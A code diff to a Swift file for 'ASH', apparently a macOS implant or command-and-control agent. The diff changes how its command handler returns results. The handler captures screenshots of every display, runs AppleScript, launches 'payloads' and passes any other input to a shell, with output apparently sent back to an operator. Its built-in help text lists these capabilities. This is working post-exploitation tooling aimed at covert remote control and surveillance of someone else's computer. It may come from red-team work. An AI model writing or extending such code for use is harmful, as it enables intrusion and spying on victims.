@@ -153,9 +153,8 @@ public struct ASH {
             case ("screenshot;"):
                 //Gets overall displays
                 //Some bugs exist with this command
+                //For example, it doesn't cycle through virtual desktops and will screenshot a random one
                 //This will notify the user requesting permission to take pictures on 10.15+
-                //CONVERT TO RAW
-//                let path = command.components(separatedBy: "; ")[safe: 1]
                 var displayCount: UInt32 = 0
                 var displayList = CGGetActiveDisplayList(0, nil, &displayCount)
                 if (displayList == CGError.success) {
@@ -166,8 +165,6 @@ public struct ASH {
                     if (displayList == CGError.success) {
                         for singleDisplay in 1...displayCount {
                             let screenshotTime = Date().timeIntervalSince1970
-//                                let fullPath = path! + String(screenshotTime) + "_" + String(singleDisplay)
-//                                let filePath = URL(fileURLWithPath: fullPath + ".jpg")
                             let screenshot:CGImage = CGDisplayCreateImage(activeDisplay[Int(singleDisplay-1)])!
                             let bitmap = NSBitmapImageRep(cgImage: screenshot)
                             let screenshotData = bitmap.representation(using: .jpeg, properties: [:])!
@@ -196,29 +193,29 @@ public struct ASH {
 //            if commandSplit != nil {
 //                do {
 //                    try NSWorkspace.shared.launchApplication(at: URL(fileURLWithPath: commandSplit!), options: .default, configuration: .init())
+//                    return returnData(inCommand: String(progCallSplit), returnType: "String", returnData: command + " successful").returnDict as NSDictionary
 //                }
 //                catch {
-//                    print(error)
-//                    return
+//                    return returnData(inCommand: String(progCallSplit), returnType: "Error", returnData: error).returnDict as NSDictionary
 //                }
 //            }
-//            case ("man;"):
-//                let commandResult = """
-//                The following are commands ran as API calls:
-//                mkdir; --- Make a directory in your current directory.
-//                whoami; --- Print the current user.
-//                cdr; --- Go to a single folder from your current directory.
-//                cd; --- Change directories.
-//                ls; --- List the directory.
-//                ps; --- Will list all processes not limited to user processes.
-//                strings; --- This will print the contents of a file.
-//                mv; --- Perform a mv command to move files/folders.
-//                cp; --- Copy a file/folder.
-//                screenshot; <Destination> --- Take a snapshot of all screens. This will notify the user.
-//                osascript; <Code> --- This will run an Apple script.
-//                execute; <App to Run> --- This will execute a payload as an API call (no shell needed). Sometimes this works better if you're already in the directory of the payload.
-//                """
-//                print(commandResult)
+            case ("man;"):
+                let commandResult = """
+                The following are commands ran as API calls:
+                mkdir; --- Make a directory in your current directory.
+                whoami; --- Print the current user.
+                cdr; --- Go to a single folder from your current directory.
+                cd; --- Change directories.
+                ls; --- List the directory.
+                ps; --- Will list all processes not limited to user processes.
+                strings; --- This will print the contents of a file.
+                mv; --- Perform a mv command to move files/folders.
+                cp; --- Copy a file/folder.
+                screenshot; <Destination> --- Take a snapshot of all screens. This will notify the user.
+                osascript; <Code> --- This will run an Apple script.
+                execute; <App to Run> --- This will execute a payload as an API call (no shell needed). Sometimes this works better if you're already in the directory of the payload.
+                """
+                return returnData(inCommand: String(progCallSplit), returnType: "String", returnData: commandResult).returnDict as NSDictionary
             default:
                 let shell = Process()
                 let output = Pipe()
@@ -230,7 +227,7 @@ public struct ASH {
                 shell.waitUntilExit()
                 let data = output.fileHandleForReading.readDataToEndOfFile()
                 let newOutput = String(data: data, encoding: .utf8)
-                print(newOutput!)
+                return returnData(inCommand: String(progCallSplit), returnType: "String", returnData: newOutput!).returnDict as NSDictionary
             }
         }
         else {
